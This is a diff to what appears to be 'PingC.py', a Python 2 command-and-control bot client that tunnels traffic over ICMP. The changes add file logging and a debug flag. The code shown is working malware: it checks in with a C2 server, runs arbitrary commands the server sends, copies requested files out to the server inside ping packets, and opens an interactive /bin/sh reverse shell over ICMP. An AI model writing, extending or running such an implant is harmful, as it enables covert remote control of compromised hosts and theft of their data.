@@ -8,23 +8,38 @@
 
 import fileinput
 import sys
+from datetime import date
 import time
 import signal
 import subprocess as sub
 from ConfigParser import SafeConfigParser
+from optparse import OptionParser
 from scapy.all import *
 import select
 from impacket import ImpactDecoder
 from impacket import ImpactPacket
 
 
+def printLine(line,flag):
+        logfile = file('log/pingc.log', 'a')
+        if int(flag) == 2:
+                logfile.write(line + '\n')
+                print line
+        if int(flag) == 1:
+                logfile.write(line + '\n')
+                if not '[D]' in str(line):
+                        print line
+        else:
+                logfile.write(line + '\n')
+        return
+
 
 def pingshell(dst):
-	#print "[D] Dst: %s" % dst
+	printLine( "[D] Dst: %s" % (dst),flag)
 	s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
 	s.setblocking(0)
 	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-	print "[*] Socket created"
+	printLine( "[*] Socket created",flag)
 	
 	ip = ImpactPacket.IP()
 	ip.set_ip_dst(dst)
@@ -33,7 +48,7 @@ def pingshell(dst):
 	icmp = ImpactPacket.ICMP()
 	icmp.set_icmp_type(icmp.ICMP_ECHO)
 	response = "#"
-	print "[D] Response: %s" % response 
+	printLine( "[D] Response: %s" % (response), flag) 
 	# Include the command as data inside the ICMP packet
 	icmp.contains(ImpactPacket.Data(response))
 
@@ -54,7 +69,7 @@ def pingshell(dst):
 	while 1:
 		# Wait for incoming replies
 		if s in select.select([ s ], [], [], 15)[0]:
-			print "[*] Packet received from %s" % dst
+			printLine("[*] Packet received from %s" % (dst),flag)
 			buff = s.recv(4096)
 
         		if 0 == len(buff):
@@ -70,7 +85,7 @@ def pingshell(dst):
         		data = icmppacket.get_data_as_string()
 			if len(data) > 0:
         			if data != '\n':
-					print "[D] Data: %s" % str(data)
+					printLine("[D] Data: %s" % (str(data)),flag)
 					if data.split('\n')[0] == 'exit':
                                 		s.close()
 						return
@@ -78,24 +93,25 @@ def pingshell(dst):
 					try:
                 				shell_proc=sub.Popen(["/bin/sh", "-i"],shell=True,stdin=sub.PIPE,stdout=sub.PIPE,stderr=sub.PIPE)
         				except Exception, e:
-                				print "[X] ERROR: %s" % str(e)
+                				printLine("[X] ERROR: %s" % (str(e)),flag)
 					
 					try:
 						response = shell_proc.communicate(data)[0]
-						print "[D] Response: %s" % response
+						printLine("[D] Response: %s" % (response),flag)
+
 					except Exception,e:
-						print "[X] Error reading response"
+						printLine( "[X] Error reading response",flag)
 						response = 'error\n'
 					response = response + '#'
-					print "[D] Response: %s" % response
+					printLine("[D] Response: %s" % (response),flag)
 				else:
 					response = '#'
         		
 			if len(response) > 1432:
 				chunks, chunk_size = len(response), len(response)/1432
-				print "[D] Chunks: %s, chunk_size: %s" % (chunks, chunk_size)
+				printLine( "[D] Chunks: %s, chunk_size: %s" % (chunks, chunk_size),flag)
 				for i in range(0, chunks, chunk_size):
-					print "[D] Response[%s]: %s" % (i,str(response[i:i+chunk_size]))
+					printLine( "[D] Response[%s]: %s" % (i,str(response[i:i+chunk_size])),flag)
 			
 					# Include the command as data inside the ICMP packet
 					icmp.contains(ImpactPacket.Data(str(response[i:i+chunk_size])))
@@ -109,7 +125,7 @@ def pingshell(dst):
 
         				# Send it to the target host
         				s.sendto(ip.get_packet(), (dst, 0))
-					print "[D] Packet sent: %s" % response
+					printLine( "[D] Packet sent: %s" % (response),flag)
 			else:
 				# Include the command as data inside the ICMP packet
                                 icmp.contains(ImpactPacket.Data(response))
@@ -123,12 +139,12 @@ def pingshell(dst):
 
                                 # Send it to the target host
                                 s.sendto(ip.get_packet(), (dst, 0))
-                                print "[D] Packet sent: %s" % response
+                                printLine( "[D] Packet sent: %s" % (response),flag)
 		else:
-			print "[*] Select timeout hit, resending empty prompt"
+			printLine( "[*] Select timeout hit, resending empty prompt",flag)
 			count = count + 1
 			if count == 9:
-				print "[X] Session lost, disconnecting"
+				printLine("[X] Session lost, disconnecting",flag)
 				return
 			ip = ImpactPacket.IP()
         
@@ -150,7 +166,7 @@ def pingshell(dst):
         
         		# Send it to the target host
         		s.sendto(ip.get_packet(), (dst, 0))
-	print "[*] Socket closed and returning"
+	printLine( "[*] Socket closed and returning",flag)
 
 
 def getSleep():
@@ -160,7 +176,7 @@ def getSleep():
         cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         sleep = cp.get(section,'sleep')
-	print "[*] Sleeping for %s seconds" % sleep
+	printLine( "[*] Sleeping for %s seconds" % (sleep),flag)
 	time.sleep(int(sleep))
 	return	
 
@@ -178,13 +194,13 @@ def setSleep(sleep):
 
 def getId():
 	conf_file = 'conf/pingc.conf'
-	#print "[D] Getting bot Id"
+	printLine( "[D] Getting bot Id",flag)
 	cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
         cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         id = cp.get(section,'id')
-	#print "[D] ID found: %s" % id
+	printLine( "[D] ID found: %s" % (id),flag)
 	return id	
 
 def setId(botId):
@@ -213,24 +229,24 @@ def handler(signum, frame):
         sys.exit()
 
 def sendFile(filename,botId):
-	print "[*] Sending file: %s" % filename
+	printLine( "[*] Sending file: %s" % (filename),flag)
 	try:
 		file = open(filename, 'r')
 	except Exception, e:
-		print "[X] File error: %s" % str(e)
+		printLine( "[X] File error: %s" % (str(e)),flag)
 		return
 	startLine = '(FILE_START) ' + botId + ' ' + str(filename)
-	print "[D] Startline: %s" % startLine
+	printLine("[D] Startline: %s" % (startLine),flag)
 	packet=IP(dst=sys.argv[1])/ICMP()/startLine
 	p=sr1(packet,timeout=1)
 	for line in file:
-		#print "[D] Sending line: %s" % line
+		printLine( "[D] Sending line: %s" % (line),flag)
 		sendLine = '(FILE) ' + botId + ' ' + filename + ' ' + line
 		packet=IP(dst=sys.argv[1])/ICMP()/sendLine
 		#send(packet)
 		#time.sleep(1)
 		p=sr1(packet,timeout=1)
-	print "[D] End of file"
+	printLine( "[D] End of file",flag)
 	finishLine = '(FILE_END) ' + botId + ' ' + str(filename)
 	packet=IP(dst=sys.argv[1])/ICMP()/finishLine
 	send(packet)
@@ -244,7 +260,7 @@ def sendPingRequest(request,botId):
 	else:
 		packet=IP(dst=sys.argv[1])/ICMP()/str(full_request)
         #packet.show()
-        print "[*] Request sent to C2 server: " + request
+        #print "[*] Request sent to C2 server: " + request
 	try:
 		p=sr1(packet,timeout=10)
 		#p.show()
@@ -253,7 +269,7 @@ def sendPingRequest(request,botId):
         	else:
                 	return
         except:
-		print "[X] Error receiving packet"
+		printLine( "[X] Error receiving packet",flag)
 
 def processReply(p):
 	try:
@@ -262,17 +278,17 @@ def processReply(p):
 		print "[X] Error: ", sys.exc_info()[0]
 		return
 	# Check ICMP data for 'run' command
-        print "[*] String received from C2 server: " + p['Raw'].load
+        printLine( "[*] String received from C2 server: " + p['Raw'].load,flag)
         if 'run' in response:
-        	print "[*] Master says run command: " + response[4:]
+        	printLine( "[*] Master says run command: " + response[4:],flag)
                 command = response[4:]
                 command.split()
                 proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
-		print output
-                print errors
+		printLine( output,flag)
+                printLine( errors,flag)
 	elif 'sysinfo' in response:
-        	print "[*] Master requesting sysinfo"
+        	printLine( "[*] Master requesting sysinfo",flag)
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
                 botId=getId()
@@ -280,48 +296,62 @@ def processReply(p):
 		p=sendPingRequest(sendRequest, botId)
 		if p:	
 			processReply(p)
-		#print output
-                print errors
+		printLine(output,flag)
+                printLine( errors,flag)
 	elif 'Thanks' in response:
-		print "[*] Thanks received"
-		print "[*] Sleeping for 10"
+		printLine( "[*] Thanks received",flag)
+		printLine( "[*] Sleeping for 10",flag)
 		time.sleep(10)
         elif 'get' in response:
-		print "[*] Master says give him %s" % response[4:]
+		printLine( "[*] Master says give him %s" % (response[4:]),flag)
 		botId=getId()
-		print "[D] filesSent: %s" % str(filesSent)
+		printLine( "[D] filesSent: %s" % (str(filesSent)),flag)
 		if response[4:] not in filesSent:
 			sendFile(response[4:], botId)
 			filesSent.append(response[4:])
 		else:
-			print "[*] File already sent...skipping"
+			printLine( "[*] File already sent...skipping",flag)
 		 
 	elif 'sleep' in response:
 		seconds = response[6:]
-                print "[*] Master says sleep for %s seconds" % (seconds)
-                print "[*] Sleeping..."
+                printLine("[*] Master says sleep for %s seconds" % (seconds),flag)
+                printLine ("[*] Sleeping...",flag)
                 setSleep(seconds)
 	elif 'id=' in response:
-		print "[*] Checked in...placing id in conf file"
+		printLine("[*] Checked in...placing id in conf file",flag)
 		setId(response[3:])
 	elif 'shell' in response:
-		print "[*] Master wants shell, master gets shell"
+		printLine( "[*] Master wants shell, master gets shell",flag)
 		time.sleep(10)
 		pingshell(sys.argv[1])
 
 def main(argv):
 	global filesSent
+	global flag
 	filesSent = []
+	flag = 0
+	
+	parser = OptionParser(usage="%prog [-d] <Server IP>")
+        parser.add_option("-d", "--debug", help="add debug statements (1 for standard, 2 for more)",metavar="LEVEL")
+        (options, args) = parser.parse_args()
+        if options.debug:
+		flag = options.debug
+       	 
+	printLine("--------------------------------------------",flag)
+        printLine("PingC.py started on %s" % (date.today()),flag)
+        printLine("--------------------------------------------",flag)
+        printLine("[D] flag=%s" % (flag),flag)
+
 	if int(active()) != 1:
-		print "[*] Not checked in...checking in now"
+		printLine("[*] Not checked in...checking in now",flag)
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
                 p=sendPingRequest('Checkin %s' % output,'123456789')
                 if p:
                         processReply(p)
-                #print output
-                print errors
-		#print "[D] id==null"
+                printLine(output,flag)
+                printLine(errors,flag)
+		printLine("[D] id==null",flag)
 	while True:
 		if len(argv) < 1:
 			print "----------------------------"
